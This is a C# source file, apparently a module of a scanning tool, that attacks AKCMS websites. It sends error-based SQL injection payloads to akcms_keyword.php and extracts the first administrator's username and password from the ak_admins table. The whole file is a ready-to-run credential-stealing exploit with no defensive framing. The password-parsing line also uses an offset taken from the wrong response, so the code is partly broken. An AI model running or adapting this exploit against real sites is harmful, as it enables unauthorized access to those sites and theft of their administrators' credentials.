using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class akcms
	{
		public string exp(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			return this.zhuru(urls);
		}
		public string zhuru(string url)
		{
			string result;
			try
			{
				string userexp = "/akcms_keyword.php?sid=11111'and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,editor,0x27,0x7e) from ak_admins limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and '1'='1&keyword=11";
				string passexp = "/akcms_keyword.php?sid=11111'and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,password,0x27,0x7e) from ak_admins limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and '1'='1&keyword=11";
				WebClient cli = new WebClient();
				cli.Encoding = Encoding.Default;
				string shuju = cli.DownloadString(url + userexp);
				if (shuju.Contains("information_schema.tables"))
				{
					string shujus = shuju.Substring(shuju.IndexOf("'~'") + 3, 34);
					string user = shujus.Substring(0, shujus.IndexOf("'"));
					string shuju2 = cli.DownloadString(url + passexp);
					string shujus2 = shuju2.Substring(shuju.IndexOf("'~'") + 3, 34);
					string pass = shujus2.Substring(0, shujus2.IndexOf("'"));
					result = user + "++" + pass;
				}
				else
				{
					result = "网站未发现安全隐患";
				}
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
